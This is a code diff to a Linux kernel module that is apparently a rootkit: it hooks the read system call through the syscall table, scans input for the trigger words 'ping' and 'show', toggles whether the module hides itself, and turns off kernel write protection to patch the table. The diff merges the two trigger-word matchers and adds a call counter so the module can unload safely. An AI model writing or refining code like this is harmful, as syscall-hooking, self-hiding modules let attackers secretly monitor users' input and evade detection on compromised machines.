@@ -11,6 +11,7 @@
 #include <linux/hash.h>
 #include <linux/cred.h>
 #include <linux/sysfs.h>
+#include <linux/delay.h>
 
 #include "sysmap.h"
 #define member rb
@@ -19,6 +20,8 @@ static struct list_head *module_previous;
 static int  hidden = 0;
 static int state = 0;
 static int hstate = 0;
+
+static int call_counter = 0;
 
 void **sys_call_table;
 
@@ -109,32 +112,9 @@ void module_show(void)
 	hidden = !hidden;
 }
 
-/* State machine to match word "ping" */
-static void match_ping(char c)
-{	
-        switch(c)
-        {
-          case 'p':if(!state) state++;
-                   break;
 
-          case 'i':if(state == 1) state++;
-                   break;
-
-          case 'n':if(state == 2) state++;
-                   break;
-
-          case 'g':if(state == 3) {printk(KERN_INFO"PONG"); state = 0;}
-                    break;
-
-          default: state = 0;
-                   break;
-        }
-
-	return;
-}
-
-/* State machine to match word "show" */
-static void match_show(char c)
+/* State machine to match words "show" and "ping"*/
+static void match_word(char c)
 {
 	switch(c)
         {
@@ -150,8 +130,19 @@ static void match_show(char c)
           case 'w':if(hstate == 3) {hstate = 0; module_show();}
                     break;
 
-          default: state = 0;
+	  case 'p':if(!state) state++;
                    break;
+
+          case 'i':if(state == 1) state++;
+                   break;
+
+          case 'n':if(state == 2) state++; 
+                   break;
+
+          case 'g':if(state == 3) {printk(KERN_INFO"pong\n"); state = 0;}
+                    break;
+
+          default: state = 0; hstate = 0; break;
         }
 	return;
 }
@@ -161,8 +152,8 @@ void scan_input(long count, char *buf)
         int i = 0;
         for(i = 0; i<count ; i++)
         {
-		match_ping(buf[i]);
-		match_show(buf[i]);	
+		//match_ping(buf[i]);
+		match_word(buf[i]);	
 	}
 }
 
@@ -172,7 +163,9 @@ void scan_input(long count, char *buf)
  */
 asmlinkage long manipulated_read (unsigned int fd, char __user *buf, size_t count)
 {
-        long ret;
+        call_counter++;
+	
+	long ret;
         ret = original_read(fd,buf,count);
 
         //read from stdin and print it using printk
@@ -182,7 +175,9 @@ asmlinkage long manipulated_read (unsigned int fd, char __user *buf, size_t coun
 		scan_input(ret,buf);
         }
 
+	call_counter--;
         return ret;
+	
 }
 
 /*
@@ -244,6 +239,10 @@ static void __exit hidemodule_exit(void)
 {
 	printk(KERN_INFO "Unloading hidden module... bye!\n");
 
+	while(call_counter > 0)
+	{
+		msleep(2);
+	}
         /* disable the write-protection */
         disable_page_protection();
 
